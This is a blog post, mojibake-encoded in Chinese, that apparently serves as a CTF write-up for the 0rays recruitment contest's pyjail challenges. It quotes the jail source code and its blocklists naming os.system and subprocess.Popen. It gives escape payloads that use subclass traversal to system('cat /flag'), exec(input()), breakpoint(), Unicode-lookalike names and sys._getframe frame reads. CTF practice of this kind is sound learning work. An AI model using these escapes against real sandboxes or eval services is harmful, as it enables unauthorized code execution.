

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="s0k1y">
  <meta name="keywords" content="">
  
    <meta name="description" content="0raysæ‹›æ–°èµ› æ¯”èµ›è¿›è¡Œäº†ä¸‰å¤©ï¼Œæœ€ç»ˆæ’äº†12åï¼Œæ¯”è‡ªå·±è®¤ä¸ºçš„ç»“æœå¥½ä¸€ç‚¹ï¼Œctfçš„è¯æˆ‘è¿˜åœ¨åˆå­¦çŠ¶æ€ï¼Œè¿˜è¦ç»§ç»­åŠ æ²¹! ç¥ 2024 ä¸€è·¯é¡ºé£ Pyjail Pyjail   æˆ‘ä¹‹å‰åªæ¥è§¦è¿‡ä¸€ç‚¹pyjailï¼Œä½†ä¹ æƒ¯å­˜ç¬”è®° æ˜¯è¾¹å­¦è¾¹åšçš„ å‰å‡ ä¸ªéƒ½æŒºç®€å• ç›´æ¥æ‰“å°±ok è—åœ¨ç¯å¢ƒå˜é‡é‡Œäº†  pyjail2 WELCOME &#x3D; â€˜â€™â€™  | |  | ____\ \  &#x2F; &#x2F; _| |   | \ | |">
<meta property="og:type" content="article">
<meta property="og:title" content="2023å¹´æœ«_0raysæ‹›æ–°èµ›">
<meta property="og:url" content="https://s0k1y.github.io/2024/01/01/CBCTF/index.html">
<meta property="og:site_name" content="s0k1y&#39;s world">
<meta property="og:description" content="0raysæ‹›æ–°èµ› æ¯”èµ›è¿›è¡Œäº†ä¸‰å¤©ï¼Œæœ€ç»ˆæ’äº†12åï¼Œæ¯”è‡ªå·±è®¤ä¸ºçš„ç»“æœå¥½ä¸€ç‚¹ï¼Œctfçš„è¯æˆ‘è¿˜åœ¨åˆå­¦çŠ¶æ€ï¼Œè¿˜è¦ç»§ç»­åŠ æ²¹! ç¥ 2024 ä¸€è·¯é¡ºé£ Pyjail Pyjail   æˆ‘ä¹‹å‰åªæ¥è§¦è¿‡ä¸€ç‚¹pyjailï¼Œä½†ä¹ æƒ¯å­˜ç¬”è®° æ˜¯è¾¹å­¦è¾¹åšçš„ å‰å‡ ä¸ªéƒ½æŒºç®€å• ç›´æ¥æ‰“å°±ok è—åœ¨ç¯å¢ƒå˜é‡é‡Œäº†  pyjail2 WELCOME &#x3D; â€˜â€™â€™  | |  | ____\ \  &#x2F; &#x2F; _| |   | \ | |">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210357306.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210158148.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230195505305.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202058509.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202215233.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230204803341.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213024485.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213412476.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230231335976.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3167109/202311/3167109-20231105210217071-751520816.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101111153757.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112344385.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112626332.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231011440323.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094016989.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094025074.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231084554889.png">
<meta property="og:image" content="https://image.3001.net/images/20211119/1637308825_619759992d43a3b586529.png!small">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140634784.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231140924176.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231150503334.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231152008650.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230160906147.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230161226648.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230162504375.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101012742813.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101021928005.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124114949.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124059427.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101124159682.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230100119014.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105344499.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105809617.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230105856162.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231154143347.png">
<meta property="og:image" content="http://img.mp.itc.cn/q_mini,c_zoom,w_640/upload/20170615/716f1c264aef4ea0a1f6b8b4dcfa9be0_th.jpg">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231155036279.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231211149638.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101141831314.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180835810.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180927920.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182024195.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101181249352.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182121236.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101184010183.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101202459405.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101203131057.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231213502848.png">
<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101212200012.png">
<meta property="article:published_time" content="2024-01-01T00:30:00.000Z">
<meta property="article:modified_time" content="2024-01-01T17:15:49.951Z">
<meta property="article:author" content="s0k1y">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210357306.png">
  
  
  
  <title>2023å¹´æœ«_0raysæ‹›æ–°èµ› - s0k1y&#39;s world</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"s0k1y.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2023å¹´æœ«_0raysæ‹›æ–°èµ›"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-01 08:30" pubdate>
          2024å¹´1æœˆ1æ—¥ æ—©ä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          25k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          206 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2023å¹´æœ«_0raysæ‹›æ–°èµ›</h1>
            
            
              <div class="markdown-body">
                
                <h1>0raysæ‹›æ–°èµ›</h1>
<p>æ¯”èµ›è¿›è¡Œäº†ä¸‰å¤©ï¼Œæœ€ç»ˆæ’äº†12åï¼Œæ¯”è‡ªå·±è®¤ä¸ºçš„ç»“æœå¥½ä¸€ç‚¹ï¼Œctfçš„è¯æˆ‘è¿˜åœ¨åˆå­¦çŠ¶æ€ï¼Œè¿˜è¦ç»§ç»­åŠ æ²¹!</p>
<p>ç¥ 2024 ä¸€è·¯é¡ºé£</p>
<h5 id="Pyjail">Pyjail</h5>
<h6 id="Pyjail-2">Pyjail</h6>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210357306.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101210158148.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>æˆ‘ä¹‹å‰åªæ¥è§¦è¿‡ä¸€ç‚¹pyjailï¼Œä½†ä¹ æƒ¯å­˜ç¬”è®°</p>
<p>æ˜¯è¾¹å­¦è¾¹åšçš„</p>
<p>å‰å‡ ä¸ªéƒ½æŒºç®€å•</p>
<p>ç›´æ¥æ‰“å°±ok</p>
<p>è—åœ¨ç¯å¢ƒå˜é‡é‡Œäº†</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230195505305.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h6 id="pyjail2">pyjail2</h6>
<p>WELCOME = â€˜â€™â€™</p>
<hr>
<p>| |  | ____\ \  / / _<em><strong>| |   |</strong></em> \</p>
<p>| |  |  _|  \ \ / /|  _| | |    __) |</p>
<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  / __/</p>
<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |_____|</p>
<p>â€‹</p>
<p>â€˜â€™â€™</p>
<p>print(WELCOME)</p>
<p>print(â€œWelcome to the JBNRZâ€™s pyjailâ€)</p>
<p>print(â€œEnter your expression and I will evaluate it for you.â€)</p>
<p>print(&quot;Example: &quot;)</p>
<p>print(&quot;  input: 1 + 1&quot;)</p>
<p>print(&quot;  Result: 2&quot;)</p>
<p>input_data = input(&quot;&gt; &quot;)</p>
<p>try:</p>
<p>print(â€œResult: {}â€.format(eval(input_data)))</p>
<p>except Exception as e:</p>
<p>print(f&quot;Result: {e}&quot;)</p>
<p>nc</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202058509.png" srcset="/img/loading.gif" lazyload alt=""></p>
<ul>
<li>ç®€å•çš„éšä¾¿æ‰¾ä¸€ä¸ªpayloadå°±èƒ½æ‰“</li>
<li>[ x.<strong>init</strong>.<strong>globals</strong> for x in â€˜â€™.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() if x.<strong>name</strong>==â€œ_wrap_closeâ€][0][â€œsystemâ€](â€œcat /flagâ€)</li>
</ul>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230202215233.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h6 id="pyjail3">pyjail3</h6>
<p>WELCOME = â€˜â€™â€™</p>
<hr>
<p>| |  | ____\ \  / / _<em><strong>| |   |</strong></em> /</p>
<p>| |  |  _|  \ \ / /|  <em>| | |    |</em> \</p>
<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  ___) |</p>
<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |____/</p>
<p>â€‹</p>
<p>â€˜â€™â€™</p>
<p>print(WELCOME)</p>
<p>print(â€œWelcome to the JBNRZâ€™s pyjailâ€)</p>
<p>print(â€œEnter your expression and I will evaluate it for you.â€)</p>
<p>print(&quot;Example: &quot;)</p>
<p>print(&quot;  input: 1 + 1&quot;)</p>
<p>print(&quot;  Result: 2&quot;)</p>
<p>input_data = input(&quot;&gt; &quot;)</p>
<p>if len(input_data) &gt; 13:</p>
<p>print(â€œItâ€™s too long to evalâ€)</p>
<p>exit(0)</p>
<p>try:</p>
<p>print(â€œResult: {}â€.format(eval(input_data)))</p>
<p>except Exception as e:</p>
<p>print(f&quot;Result: {e}&quot;)</p>
<p>æœ‰äº†é•¿åº¦é™åˆ¶</p>
<p>pyloadï¼šexec(input()) ç»•è¿‡è¾“å…¥é•¿åº¦é™åˆ¶</p>
<p>å°å¿ƒç©ºæ ¼</p>
<p>CBCTF{9b8d0d15-84d3-4dae-89f0-ac8d83e8de20}</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230204803341.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h6 id="pyjail4">pyjail4</h6>
<p>WELCOME = â€˜â€™â€™</p>
<hr>
<p>| |  | ____\ \  / / ____| |   | || |</p>
<p>| |  |  _|  \ \ / /|  <em>| | |   | || |</em></p>
<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  |__  _|</p>
<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|   |_|</p>
<p>â€‹</p>
<p>â€˜â€™â€™</p>
<p>print(WELCOME)</p>
<p>print(â€œWelcome to the JBNRZâ€™s pyjailâ€)</p>
<p>print(â€œEnter your expression and I will evaluate it for you.â€)</p>
<p>print(&quot;Example: &quot;)</p>
<p>print(&quot;  input: 1 + 1&quot;)</p>
<p>print(&quot;  Result: 2&quot;)</p>
<p>input_data = input(&quot;&gt; &quot;)</p>
<p>if len(input_data) &gt; 12:</p>
<p>print(â€œItâ€™s too long to evalâ€)</p>
<p>exit(0)</p>
<p>try:</p>
<p>print(â€œResult: {}â€.format(eval(input_data)))</p>
<p>except Exception as e:</p>
<p>print(f&quot;Result: {e}&quot;)</p>
<p>å•Šå•Šå•Šå•Šå•Šå•Šå•Š</p>
<p>åˆé™åˆ¶å­—ç¬¦å•¦ï¼</p>
<p>å•Šå•Šå•Šå•Šå•Šå•Šå•Š</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213024485.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>breakpoint()</p>
<p>ç„¶åç›´æ¥å†™pyä»£ç å°±è¡Œ</p>
<h6 id="oyjail5">oyjail5</h6>
<p>WELCOME = â€˜â€™â€™</p>
<hr>
<p>| |  | ____\ \  / / ____| |   | ___|</p>
<p>| |  |  <em>|  \ \ / /|  <em>| | |   |</em></em>_ \</p>
<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  ___) |</p>
<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |____/</p>
<p>â€‹</p>
<p>â€˜â€™â€™</p>
<p>black = [â€œinputâ€, â€œimportâ€, â€œosâ€, â€œopenâ€, â€œpopenâ€, â€œsystemâ€, â€œreadâ€, â€œ_â€, â€œ'â€, â€œ&quot;â€]</p>
<p>print(WELCOME)</p>
<p>print(â€œWelcome to the JBNRZâ€™s pyjailâ€)</p>
<p>print(â€œEnter your expression and I will evaluate it for you.â€)</p>
<p>print(&quot;Example: &quot;)</p>
<p>print(&quot;  input: 1 + 1&quot;)</p>
<p>print(&quot;  Result: 2&quot;)</p>
<p>input_data = input(&quot;&gt; &quot;)</p>
<p>if any([i in input_data for i in black]):</p>
<p>print(â€œOhhhh, what are you doing???!!!â€)</p>
<p>exit(0)</p>
<p>try:</p>
<p>print(â€œResult: {}â€.format(eval(input_data)))</p>
<p>except Exception as e:</p>
<p>print(f&quot;Result: {e}&quot;)</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230213412476.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>æ²¡æœ‰è¿‡æ»¤breakpointå“¦</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&quot;cat /flag&quot;</span>)</span><br></code></pre></td></tr></table></figure>
<h6 id="pyjail-6">pyjail 6</h6>
<p>from string import ascii_letters</p>
<p>WELCOME = â€˜â€™â€™</p>
<hr>
<p>| |  | ____\ \  / / ___<em>| |    / /</em></p>
<p>| |  |  _|  \ \ / /|  <em>| | |   | â€™</em> \</p>
<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  | (_) |</p>
<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|  ___/</p>
<p>â€‹</p>
<p>â€˜â€™â€™</p>
<p>print(WELCOME)</p>
<p>print(â€œWelcome to the JBNRZâ€™s pyjailâ€)</p>
<p>print(â€œEnter your expression and I will evaluate it for you.â€)</p>
<p>print(&quot;Example: &quot;)</p>
<p>print(&quot;  input: 1 + 1&quot;)</p>
<p>print(&quot;  Result: 2&quot;)</p>
<p>input_data = input(&quot;&gt; &quot;)</p>
<p>if any([i in ascii_letters for i in input_data]):</p>
<p>print(â€œOhhhh, what are you doing???!!!â€)</p>
<p>exit(0)</p>
<p>try:</p>
<p>print(â€œResult: {}â€.format(eval(input_data)))</p>
<p>except Exception as e:</p>
<p>print(f&quot;Result: {e}&quot;)</p>
<p>Python 3 å¼€å§‹æ”¯æŒéASCIIå­—ç¬¦çš„æ ‡è¯†ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥ä½¿ç”¨ Unicode å­—ç¬¦ä½œä¸º Python çš„å˜é‡å</p>
<p>å¦‚breakpoint   è§ä¸»æœºä¸­UNicodeæ¬ºéª—æˆ‘çš„è„šæœ¬</p>
<p>ğ”Ÿğ”¯ğ”¢ğ”ğ”¨ğ”­ğ”¬ğ”¦ğ”«ğ”±()</p>
<p>CBCTF{52fb1c00-1675-472b-9b24-9ac8bf846aff}</p>
<h6 id="pyjail7">pyjail7</h6>
<p>nc training.0rays.club 10039</p>
<hr>
<p>| |   | <em><em><strong>\ \   / / <em><em><strong>| |     |</strong></em>  |<br>
| |   |  <em>|  \ \ / /|  <em>| | |        / /<br>
| |</em></em></em>| |</strong></em>  \ V / | |</em><strong>| |</strong>_    / /<br>
|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|  /_/</p>
<p>You have three choice:</p>
<ol>
<li>
<p>Play the guessing game</p>
</li>
<li>
<p>Get important code about lucky_num</p>
</li>
<li></li>
</ol>
<p>black = {â€˜pty.spawnâ€™, â€˜os.systemâ€™, â€˜os.execâ€™, â€˜os.posix_spawnâ€™, â€˜os.spawnâ€™, â€˜subprocess.Popenâ€™}</p>
<p>â€¦</p>
<p>def guess():<br>
game_score = 0<br>
sys.stdout.write('Can u guess the number? between 1 and 1000 &gt; ')<br>
sys.stdout.flush()</p>
<p>â€‹    my_lucky_num = [random.randint(1, 1000) for _ in range(5)]<br>
â€‹    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout<br>
â€‹    input_data = input()<br>
â€‹    try:<br>
â€‹        input_data = eval_func(input_data, {}, {})<br>
â€‹    except Exception:<br>
â€‹        return game_score, my_lucky_num<br>
â€‹    sys.stdout = challenge_original_stdout<br>
â€‹    print(input_data)<br>
â€‹    if input_data == my_lucky_num:<br>
â€‹        game_score += 1<br>
â€‹    return game_score, my_lucky_num=</p>
<p><strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>(â€˜sysâ€™)._getframe(1).f_locals))<br>
---------------------<br>
<img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230231335976.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>you need to guess my five lucky numbers.</p>
<p><img src="https://img2023.cnblogs.com/blog/3167109/202311/3167109-20231105210217071-751520816.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>input_ex: [1, 2, 3, 4, 5]<br>
Can u guess the number? between 1 and 1000 &gt; <strong>import</strong>(â€œsysâ€).<strong>stdout</strong>.write(str(<strong>import</strong>(â€˜sysâ€™)._getframe(1).f_locals))<br>
{â€˜game_scoreâ€™: 0, â€˜my_lucky_numâ€™: [456, 787, 997, 625, 528], _</p>
<p>_â€˜challenge_original_stdoutâ€™:</p>
<p>_ &lt;_io.TextIOWrapper name=â€˜<stdout>â€™ mode=â€˜wâ€™ encoding=â€˜utf-8â€™&gt;, â€˜input_dataâ€™: _</p>
<p>_</p>
<p>å¯ä»¥è·å–è°ƒç”¨æ ˆçš„å¸§å¯¹è±¡ï¼Œé»˜è®¤çš„å‚æ•°æ˜¯0ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå¦‚æœä¼ å…¥0çš„è¯å°±ä¼šè·å–evalçš„è°ƒç”¨æ ˆå¸§ï¼Œæ‰€ä»¥å¾—deepä¸€å±‚</p>
<p><strong>import</strong>(â€œsysâ€).<em>getframe(1)<br>
æˆ‘ä»¬è¯•è¯•çœ‹æ˜¯å•¥æƒ…å†µï¼Œæœ‰ä¸ªå°æŠ€å·§ï¼Œå¯ä»¥ä½¿ç”¨__import</em>_(â€œsysâ€).<strong>stdout</strong>.writeå»è¿›è¡Œæ ‡å‡†è¾“å‡ºï¼Œè¿™ä¹Ÿæ˜¯ä¸Šä¸€ä¸ªéé¢„æœŸçš„è¾“å‡ºæ–¹æ³•ã€‚</p>
